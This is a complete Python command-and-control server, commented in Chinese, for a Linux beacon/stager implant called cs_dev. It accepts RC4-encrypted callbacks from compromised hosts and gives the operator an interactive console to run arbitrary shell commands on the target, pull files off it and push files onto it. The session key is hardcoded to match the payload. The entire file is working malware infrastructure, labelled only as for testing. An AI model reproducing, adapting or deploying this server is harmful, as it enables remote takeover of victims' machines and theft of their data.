#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cs_dev :: c2_server.py  --  Linux 载荷配套 C2 服务端 (测试 / 实操)

功能:
    - 监听并接受 beacon / stager 回连
    - 交互式命令下发 (shell / 文件 / 上传下载)
    - 与 linux/beacon.c 的协议完全对应

协议:
    握手  : beacon -> [4B magic][4B len][RC4(host_info)]
    命令  : server -> [4B magic][4B len][RC4(cmd)]
    响应  : beacon -> [4B len][RC4(output)]
    上传  : server -> "upload <path>" 后紧跟 [4B len][RC4(file_bytes)]

用法:
    python c2_server.py --port 8443
    python c2_server.py --port 8443 --key 913a77c40e5bd2186fa344bc27e8059d

注意: 会话密钥必须与 beacon 编译期使用的密钥一致 (默认见下方 DEFAULT_KEY)。
      如需自定义, 修改 linux/beacon.c 与 linux/stager.c 中的 session_key。
"""
import argparse
import os
import socket
import struct
import sys
import threading
import time

DEFAULT_KEY = bytes([0x91, 0x3A, 0x77, 0xC4, 0x0E, 0x5B, 0xD2, 0x18,
                     0x6F, 0xA3, 0x44, 0xBC, 0x27, 0xE8, 0x05, 0x9D])
PROTO_MAGIC = 0x4B52424B  # "KBRK"


def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data))
    a = b = 0
    for n, byte in enumerate(data):
        a = (a + 1) & 0xFF
        b = (b + S[a]) & 0xFF
        S[a], S[b] = S[b], S[a]
        out[n] = byte ^ S[(S[a] + S[b]) & 0xFF]
    return bytes(out)


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


class Session:
    def __init__(self, conn, addr, key):
        self.conn = conn
        self.addr = addr
        self.key = key
        self.info = ""

    def send_cmd(self, cmd: str):
        payload = rc4(cmd.encode(), self.key)
        hdr = struct.pack(">II", PROTO_MAGIC, len(payload))
        self.conn.sendall(hdr + payload)

    def recv_blob(self):
        hdr = recv_exact(self.conn, 4)
        if not hdr:
            return None
        (n,) = struct.unpack(">I", hdr)
        if n == 0:
            return b""
        if n > (64 << 20):
            return None
        data = recv_exact(self.conn, n)
        if data is None:
            return None
        return rc4(data, self.key)

    def handshake(self):
        hdr = recv_exact(self.conn, 8)
        if not hdr:
            return False
        magic, n = struct.unpack(">II", hdr)
        if magic != PROTO_MAGIC or n > 8192:
            return False
        data = recv_exact(self.conn, n)
        if not data:
            return False
        self.info = rc4(data, self.key).decode("utf-8", "replace")
        return True


def handle(conn, addr, key):
    s = Session(conn, addr, key)
    if not s.handshake():
        print(f"[-] {addr} 握手失败")
        conn.close()
        return

    print(f"\n[+] 新会话 {addr}")
    print(f"    信息: {s.info}")
    print("[i] 输入命令 (help 查看; exit 断开)")

    try:
        while True:
            try:
                cmd = input("cs_dev> ").strip()
            except EOFError:
                break
            if not cmd:
                continue

            if cmd in ("help", "?"):
                print("  <任意 shell 命令>   在目标上执行")
                print("  download <path>     从目标下载文件")
                print("  upload <l> <r>      上传本地文件 l 到目标 r")
                print("  sleep <n>           调整心跳秒数")
                print("  exit                断开")
                continue

            if cmd == "exit":
                s.send_cmd("exit")
                break

            if cmd.startswith("upload "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    print("[-] 用法: upload <本地> <远端>")
                    continue
                local, remote = parts[1], parts[2]
                if not os.path.isfile(local):
                    print(f"[-] 本地文件不存在: {local}")
                    continue
                data = open(local, "rb").read()
                s.send_cmd(f"upload {remote}")
                s.conn.sendall(struct.pack(">I", len(data)) + rc4(data, s.key))
                print(f"[+] 已上传 {len(data)} 字节 -> {remote}")
                continue

            s.send_cmd(cmd)

            if cmd.startswith("download "):
                print("[i] 文件传输中 ...")
            out = s.recv_blob()
            if out is None:
                print("[-] 连接中断")
                break
            if out:
                sys.stdout.write(out.decode("utf-8", "replace"))
                if not out.endswith(b"\n"):
                    sys.stdout.write("\n")
    except (ConnectionResetError, BrokenPipeError):
        print(f"\n[-] {addr} 连接断开")
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()


def main():
    ap = argparse.ArgumentParser(description="cs_dev Linux payload C2 server")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--key", default=None, help="会话密钥 hex (默认与载荷内置一致)")
    args = ap.parse_args()

    key = bytes.fromhex(args.key) if args.key else DEFAULT_KEY

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.bind, args.port))
    srv.listen(8)
    print(f"[*] cs_dev C2 监听 {args.bind}:{args.port}")
    print(f"[*] 会话密钥 {key.hex()}")

    try:
        while True:
            conn, addr = srv.accept()
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            threading.Thread(target=handle, args=(conn, addr, key), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] 退出")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
